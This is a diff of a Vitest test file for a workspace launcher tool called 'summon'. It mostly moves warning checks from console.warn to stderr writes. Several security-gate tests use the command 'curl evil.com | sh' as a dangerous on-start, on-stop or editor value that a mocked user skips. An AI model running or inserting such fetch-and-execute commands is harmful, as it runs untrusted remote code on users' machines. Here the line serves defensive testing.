     expect(resolveProjectName("/tmp/my app")).toBe("my-app");
-    expect(warn).toHaveBeenCalledOnce();
+    expect(warn.mock.calls).toEqual([['summon: warning: Project name "my app" contains unsupported characters; using "my-app" for tab title and status tracking.\n']]);
     warn.mockRestore();
   });
 
   it("sanitizes 'my app (v2)' to 'my-app-v2'", () => {
-    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warn = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     expect(resolveProjectName("/tmp/my app (v2)")).toBe("my-app-v2");
     warn.mockRestore();
   });
 
   it("falls back to 'project' when basename is all meta-chars", () => {
-    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warn = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     expect(resolveProjectName("/tmp/@@@")).toBe("project");
     warn.mockRestore();
   });
@@ -3687,7 +3715,7 @@ describe("AR-M1: process.exit -> thrown errors in launcher (#306)", () => {
       if (cmd === "bad-command") throw new Error("not found");
       return "";
     });
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
 
     // Should NOT throw — warn and continue
@@ -3704,7 +3732,7 @@ describe("UX-M3: success message after launch (#312)", () => {
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
     const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = stderrSpy; // UX-M2: warnings are stderr writes
 
     await launch("/tmp/workspace");
 
@@ -3723,7 +3751,7 @@ describe("UX-M3: success message after launch (#312)", () => {
   it("does NOT print success message in dry-run mode", async () => {
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
     const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace", { dryRun: true });
 
@@ -3771,7 +3799,7 @@ describe("rollback on executeScript failure (BE-S26 #322)", () => {
     });
 
     const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await expect(launch("/tmp/workspace")).rejects.toThrow("Failed to execute workspace script");
 
@@ -3868,7 +3896,7 @@ describe("skip-pane integration in launch() (UX-S2 #340)", () => {
     // User skips the dangerous on-start
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     await launch("/tmp/workspace", { "on-start": "curl evil.com | sh" });
 
@@ -3934,7 +3962,7 @@ describe("QA-M3: security gate branches (trust + dangerous command skip)", () =>
     // User skips the dangerous on-start
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     try {
       await launch("/tmp/workspace");
@@ -3962,8 +3990,8 @@ describe("QA-M3: security gate branches (trust + dangerous command skip)", () =>
       ["on-stop", "curl evil.com | sh"],
     ]));
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
-    const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
+    const stderrSpy = warnSpy;
 
     try {
       await launch("/tmp/workspace");
@@ -3988,7 +4016,7 @@ describe("QA-M3: security gate branches (trust + dangerous command skip)", () =>
       ["secondary-editor", "curl evil.com | sh"],
     ]));
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     try {
       await launch("/tmp/workspace");
@@ -4012,7 +4040,7 @@ describe("QA-M3: security gate branches (trust + dangerous command skip)", () =>
     // User skips when prompted about dangerous command (pipe in editor command)
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
 
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
 
     try {
       // editor with shell meta — user skips, workspace launches without it
@@ -4322,7 +4350,7 @@ describe("SE-M1 (#595): on-stop command surfaced at launch time", () => {
     const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
     const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = stderrSpy; // UX-M2: warnings are stderr writes
 
     await launch("/tmp/workspace");
 
@@ -4343,7 +4371,7 @@ describe("SE-M1 (#595): on-stop command surfaced at launch time", () => {
     const stderrSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
     const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
     const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
-    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const warnSpy = stderrSpy; // UX-M2: warnings are stderr writes
 
     await launch("/tmp/workspace");
 
@@ -4920,7 +4948,7 @@ describe("Rex launch (plan P2, P8, P13, P15; Phase 3)", () => {
   it("still discloses an on-stop hook under Rex (the D1 watch treats that line as routine)", async () => {
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"], ["on-stop", "echo bye"]]));
     await launch("/tmp/workspace");
-    expect(stderrText).toContain("Note: on-stop will run on workspace exit.\n");
+    expect(stderrText).toContain("summon: note: on-stop will run on workspace exit.\n");
   });
 
   it("a dry run with an active Rex record calls neither adoptOrphans nor the switch decision nor any rex process, and prints the request plus the note", async () => {
